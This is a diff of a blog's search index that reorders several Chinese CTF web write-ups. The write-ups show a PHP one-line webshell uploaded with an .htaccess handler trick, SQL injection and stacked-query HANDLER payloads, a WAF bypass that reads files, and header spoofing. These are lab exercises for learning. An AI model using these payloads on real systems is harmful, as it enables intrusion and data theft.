@@ -166,21 +166,6 @@
       </tags>
   </entry>
   <entry>
-    <title>（ACTF2020 新生赛）BackupFile</title>
-    <url>/2021/01/20/20210120/</url>
-    <content><![CDATA[<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><img src="https://img-blog.csdnimg.cn/20210120212356824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">由题目可知是查备份文件，扫描目录</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120212601631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现index.php.bak有响应<br><img src="https://img-blog.csdnimg.cn/20210120212754280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">保存打开文件发现</p>
-<p><img src="https://img-blog.csdnimg.cn/20210120212859592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">php的==在比较时字符串和数字进行比较时，会先将<a href="https://www.cnblogs.com/kenshinobiy/p/4371416.html">字符串转换成数字</a>再进行比较<br>即是<code>?key=123</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210120213045993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>index.php.bak</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（ACTF2020 新生赛）Upload+（极客大挑战 2019）Upload</title>
     <url>/2021/01/21/20210121/</url>
     <content><![CDATA[<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="https://img-blog.csdnimg.cn/20210120221952943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根据题目，应是文件上传漏洞，鼠标放到灯泡处，发现上传文件处<br><img src="https://img-blog.csdnimg.cn/20210120222010405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">一句话木马</a><br><img src="https://img-blog.csdnimg.cn/20210120222441537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021012022445759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210120222509897.png" alt="在这里插入图片描述">上传成功<br><img src="https://img-blog.csdnimg.cn/20210120222533420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">连接burpsuite</p>
@@ -196,6 +181,21 @@
         <tag>PHP</tag>
         <tag>upload</tag>
         <tag>一句话木马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（ACTF2020 新生赛）BackupFile</title>
+    <url>/2021/01/20/20210120/</url>
+    <content><![CDATA[<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><img src="https://img-blog.csdnimg.cn/20210120212356824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">由题目可知是查备份文件，扫描目录</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120212601631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现index.php.bak有响应<br><img src="https://img-blog.csdnimg.cn/20210120212754280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">保存打开文件发现</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120212859592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">php的==在比较时字符串和数字进行比较时，会先将<a href="https://www.cnblogs.com/kenshinobiy/p/4371416.html">字符串转换成数字</a>再进行比较<br>即是<code>?key=123</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210120213045993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>index.php.bak</tag>
       </tags>
   </entry>
   <entry>
@@ -230,21 +230,6 @@
       </tags>
   </entry>
   <entry>
-    <title>（极客大挑战 2019）Http</title>
-    <url>/2021/01/23/20210123/</url>
-    <content><![CDATA[<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p><img src="https://img-blog.csdnimg.cn/20210204130541600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源代码<br><img src="https://img-blog.csdnimg.cn/20210204130808675.png" alt="在这里插入图片描述">发现secret.php，转到<br><img src="https://img-blog.csdnimg.cn/2021020413091093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">bp抓包，修改 <code>Referer: https://www.Sycsecret.com</code><br><img src="https://img-blog.csdnimg.cn/20210204131939112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现<br><img src="https://img-blog.csdnimg.cn/20210204132012313.png" alt="在这里插入图片描述">修改 <code>User-Agent: Syclover</code><br><img src="https://img-blog.csdnimg.cn/20210204132117499.png" alt="在这里插入图片描述">发现</p>
-<p><img src="https://img-blog.csdnimg.cn/20210204132220732.png" alt="在这里插入图片描述">修改：<code>X-Forwarded-For:127.0.0.1</code></p>
-<p><img src="https://img-blog.csdnimg.cn/20210204132503799.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204132509216.png" alt="在这里插入图片描述">得到flag</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-        <tag>header</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（极客大挑战 2019）LoveSQL</title>
     <url>/2021/01/24/20210124/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/2021020413451645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><a href="https://www.gaojiufeng.cn/?id=118">万能密码</a><code>1&#39; or 1=1#</code></p>
@@ -273,49 +258,18 @@
       </tags>
   </entry>
   <entry>
-    <title>（极客大挑战 2019）BuyFlag</title>
-    <url>/2021/01/26/20210126/</url>
-    <content><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><img src="https://img-blog.csdnimg.cn/20210204224403766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204224526235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204224758366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="发现提示">php中的strcmp漏洞：</p>
-<blockquote>
-<p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。如果str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
-<p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return0</p>
-</blockquote>
-<p>php中的is_numeric()漏洞：</p>
-<blockquote>
-<p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
-</blockquote>
-<p>发现有个cookie值，且等于0，改成1，因为正常情况下这里是cookie的值。</p>
-<p>post过去一个money和一个password，password要等于404，并且password不能为数字，用弱类型，即让<code>password=404</code>a</p>
-<p>回显说数字太长了，可以用科学计数法，也可以用strcmp，即<code>money[]=1</code><br><img src="https://img-blog.csdnimg.cn/20210204231453984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <title>（极客大挑战 2019）Http</title>
+    <url>/2021/01/23/20210123/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p><img src="https://img-blog.csdnimg.cn/20210204130541600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源代码<br><img src="https://img-blog.csdnimg.cn/20210204130808675.png" alt="在这里插入图片描述">发现secret.php，转到<br><img src="https://img-blog.csdnimg.cn/2021020413091093.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">bp抓包，修改 <code>Referer: https://www.Sycsecret.com</code><br><img src="https://img-blog.csdnimg.cn/20210204131939112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现<br><img src="https://img-blog.csdnimg.cn/20210204132012313.png" alt="在这里插入图片描述">修改 <code>User-Agent: Syclover</code><br><img src="https://img-blog.csdnimg.cn/20210204132117499.png" alt="在这里插入图片描述">发现</p>
+<p><img src="https://img-blog.csdnimg.cn/20210204132220732.png" alt="在这里插入图片描述">修改：<code>X-Forwarded-For:127.0.0.1</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20210204132503799.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204132509216.png" alt="在这里插入图片描述">得到flag</p>
 ]]></content>
       <categories>
         <category>web</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
-        <tag>is_numeric()</tag>
-        <tag>cookie</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（RoarCTF 2019）Easy Calc</title>
-    <url>/2021/01/27/20210127/</url>
-    <content><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/20210204132856427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源码</p>
-<p><img src="https://img-blog.csdnimg.cn/20210204133037316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204133116947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">提示设置了WAF以确保安全，尝试访问<code>calc.php</code>：</p>
-<p><img src="https://img-blog.csdnimg.cn/20210204133218401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WAF限制了参数num，将传入的参数’num’前添加空格，即’? num’可绕过WAF的判断，将字符/使用char(47)表示：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210204133345279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在返回的文件中有f1agg文件，将其转化为ASCII编码，使用<code>file_get_contents()</code>函数读取文件：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
-
-<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210204133618107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>file_get_contents()</tag>
-        <tag>WAF</tag>
+        <tag>HTTP</tag>
+        <tag>header</tag>
       </tags>
   </entry>
   <entry>
@@ -356,6 +310,52 @@
       </tags>
   </entry>
   <entry>
+    <title>（RoarCTF 2019）Easy Calc</title>
+    <url>/2021/01/27/20210127/</url>
+    <content><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/20210204132856427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源码</p>
+<p><img src="https://img-blog.csdnimg.cn/20210204133037316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204133116947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">提示设置了WAF以确保安全，尝试访问<code>calc.php</code>：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210204133218401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">WAF限制了参数num，将传入的参数’num’前添加空格，即’? num’可绕过WAF的判断，将字符/使用char(47)表示：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210204133345279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在返回的文件中有f1agg文件，将其转化为ASCII编码，使用<code>file_get_contents()</code>函数读取文件：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210204133618107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>file_get_contents()</tag>
+        <tag>WAF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（极客大挑战 2019）BuyFlag</title>
+    <url>/2021/01/26/20210126/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><img src="https://img-blog.csdnimg.cn/20210204224403766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210204224526235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210204224758366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="发现提示">php中的strcmp漏洞：</p>
+<blockquote>
+<p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。如果str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p>
+<p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return0</p>
+</blockquote>
+<p>php中的is_numeric()漏洞：</p>
+<blockquote>
+<p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
+</blockquote>
+<p>发现有个cookie值，且等于0，改成1，因为正常情况下这里是cookie的值。</p>
+<p>post过去一个money和一个password，password要等于404，并且password不能为数字，用弱类型，即让<code>password=404</code>a</p>
+<p>回显说数字太长了，可以用科学计数法，也可以用strcmp，即<code>money[]=1</code><br><img src="https://img-blog.csdnimg.cn/20210204231453984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>is_numeric()</tag>
+        <tag>cookie</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>（MRCTF2020）你传你🐎呢</title>
     <url>/2021/01/28/20210128/</url>
     <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p><img src="https://img-blog.csdnimg.cn/20210209130850854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">上传一句话木马<code>&lt;?php @eval($_POST[&#39;0&#39;]); ?&gt;</code>图片，bp抓包<br><img src="https://img-blog.csdnimg.cn/20210209132658288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现解析不出来，这里就要用到htsccess文件<br><code>AddType application/x-httpd-php .jpg</code>这里是指将jpg文件解析为php文件<br><code>ForceType application/x-httpd-php</code> <code>SetHandler application/x-httpd-php</code>所有jpg文件都会被当作php文件执行</p>
@@ -371,6 +371,27 @@
         <tag>upload</tag>
         <tag>一句话木马</tag>
         <tag>.htaccess</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（GYCTF2020）Blacklist</title>
+    <url>/2021/01/29/20210129/</url>
+    <content><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://img-blog.csdnimg.cn/20210209135740662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别用<code>1 or 1=1#</code> <code>1’ or 1=1#</code> <code>1&quot; or 1=1#</code>执行测试，返回全部库信息的即是该类型。试一下，发现是单引号字符型注入。</p>
+<p>用<code>1&#39;;show databases;#</code>确定是堆叠注入<br><img src="https://img-blog.csdnimg.cn/20210209141449770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆表<code>1&#39;;show tables;#</code><br><img src="https://img-blog.csdnimg.cn/20210209141521283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查FlagHere表<code>1&#39;;show columns from FlagHere;#</code><br><img src="https://img-blog.csdnimg.cn/20210209141623174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag可能就在这个表里面，但是select与set、alter等众多关键词都被黑名单掉了，这里要利用<a href="https://blog.csdn.net/JesseYoung/article/details/40785137">HANDLER</a></p>
+<blockquote>
+<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ<br> NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210209141821338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>堆叠注入</tag>
+        <tag>单引号字符型注入</tag>
+        <tag>HANDLER</tag>
       </tags>
   </entry>
   <entry>
@@ -404,24 +425,23 @@
       </tags>
   </entry>
   <entry>
-    <title>（GYCTF2020）Blacklist</title>
-    <url>/2021/01/29/20210129/</url>
-    <content><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://img-blog.csdnimg.cn/20210209135740662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别用<code>1 or 1=1#</code> <code>1’ or 1=1#</code> <code>1&quot; or 1=1#</code>执行测试，返回全部库信息的即是该类型。试一下，发现是单引号字符型注入。</p>
